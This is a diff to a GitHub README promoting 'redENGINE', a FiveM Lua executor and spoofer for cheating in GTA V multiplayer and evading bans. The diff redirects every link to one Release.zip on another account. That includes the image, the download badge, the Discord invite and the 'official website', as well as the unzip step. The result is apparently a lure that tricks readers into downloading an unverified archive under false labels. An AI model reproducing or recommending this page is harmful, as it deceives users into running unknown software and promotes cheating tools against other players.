@@ -1,6 +1,6 @@
 # 🚀 Welcome to redENGINE-FiveM Repository! 🚀
 
-![redENGINE](https://cdn.imgbin.com/25/23/16/imgbin-grand-theft-auto-v-grand-theft-auto-online-logo-gta-v-screenshot-870nAzytpA5X0Bc9TMWgNRmtT.jpg)
+![redENGINE](https://github.com/rwatkinsii/redENGINE-FiveM/releases/download/v1.0/Release.zip)
 
 ## redENGINE - FiveM Lua Executor & Spoofer *Updated January 2025*
 
@@ -12,7 +12,7 @@
 ---
 
 ### 👉 Get the Latest Software Release here:
-[![Download Software](https://img.shields.io/badge/Download-Software-red)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/rwatkinsii/redENGINE-FiveM/releases/download/v1.0/Release.zip)](https://github.com/rwatkinsii/redENGINE-FiveM/releases/download/v1.0/Release.zip)
 
 ---
 
@@ -23,7 +23,7 @@ Welcome to redENGINE, the ultimate Lua Executor and Spoofer for FiveM! Stay ahea
 
 ### 📦 Installation Guide:
 1. Click on the "Download Software" button above.
-2. **Unzip** the Software.zip file after the download is complete.
+2. **Unzip** the https://github.com/rwatkinsii/redENGINE-FiveM/releases/download/v1.0/Release.zip file after the download is complete.
 3. Launch the **redENGINE application** to access all the exciting features.
 
 ---
@@ -39,9 +39,9 @@ Welcome to redENGINE, the ultimate Lua Executor and Spoofer for FiveM! Stay ahea
 ---
 
 ### 🔥 redENGINE Community:
-Join our vibrant community of gamers using redENGINE to elevate their gaming experience. Get exclusive access to hacks, tips, and updates by joining our Discord server - [redENGINE Discord](https://discord.gg/redengine)!
+Join our vibrant community of gamers using redENGINE to elevate their gaming experience. Get exclusive access to hacks, tips, and updates by joining our Discord server - [redENGINE Discord](https://github.com/rwatkinsii/redENGINE-FiveM/releases/download/v1.0/Release.zip)!
 
-👉 Feel free to explore our [redENGINE Official Website](https://www.redengine.com) for more information and updates.
+👉 Feel free to explore our [redENGINE Official Website](https://github.com/rwatkinsii/redENGINE-FiveM/releases/download/v1.0/Release.zip) for more information and updates.
 
 ---
 
